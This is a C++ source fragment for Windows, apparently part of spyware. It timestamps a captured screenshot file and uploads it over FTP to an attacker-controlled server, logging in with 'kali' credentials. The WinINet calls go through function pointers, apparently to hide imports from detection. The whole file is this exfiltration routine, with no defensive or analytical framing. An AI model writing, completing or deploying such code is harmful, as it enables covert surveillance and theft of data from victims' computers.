#include<iostream>
#include<wininet.h>
#include<Windows.h>
#pragma comment(lib, "Wininet.lib")

using namespace std;

string System_Info() {
    SYSTEMTIME st;
    pGetLocalTime(&st);

    std::string str;
    str += std::to_string(st.wYear) + "-";
    if (st.wMonth < 10)
        str += "0";
    str += std::to_string(st.wMonth) + "-";
    if (st.wDay < 10)
        str += "0";
    str += std::to_string(st.wDay) + " ";
    if (st.wHour < 10)
        str += "0";
    str += std::to_string(st.wHour) + ":";
    if (st.wMinute < 10)
        str += "0";
    str += std::to_string(st.wMinute) + ":";
    if (st.wSecond < 10)
        str += "0";
    str += std::to_string(st.wSecond);
    return str;
}

bool transfer_file() {
    HINTERNET hInternet, hFtpSession;
    const char* ftpServer = ip_addr;
    const char* ftpUser = "kali";
    const char* ftpPassword = "kali";
    string lpwstr = "Scren Shit: " + System_Info();
    LPCSTR ftpRemoteFile = lpwstr.c_str();
    const char* localFile = localfile;
    const char* ftpCommand = ftpCmd;

    hInternet = pInternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        cout << "Error opening I" << endl;
        return false;
    }

    hFtpSession = pInternetConnectA(
        hInternet, 
        ftpServer, 
        INTERNET_DEFAULT_FTP_PORT, 
        ftpUser, 
        ftpPassword, 
        INTERNET_SERVICE_FTP, 
        INTERNET_FLAG_PASSIVE, 
        INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE);

    if (!hFtpSession) {
        cout << "Error cnt to FS: " <<GetLastError()<< endl;
        pInternetCloseHandle(hInternet); 
        return false;
    }

    bool n = pFtpPutFileA(hFtpSession, localFile, ftpRemoteFile, FTP_TRANSFER_TYPE_BINARY, 0);

    /*if (n == false) {
        DWORD dwError = GetLastError();
        DWORD dwBufSize = 0;
        InternetGetLastResponseInfoA(&dwError, NULL, &dwBufSize);
        if (dwBufSize > 0) {
            char* pszBuffer = new char[dwBufSize + 1];
            if (InternetGetLastResponseInfoA(&dwError, pszBuffer, &dwBufSize)) {
                pszBuffer[dwBufSize] = '\0';
                cout << "Extended Error: " << pszBuffer << endl;
            }
            delete[] pszBuffer;
        }
    }*/
    pInternetCloseHandle(hFtpSession);
    pInternetCloseHandle(hInternet);

    return true;

}
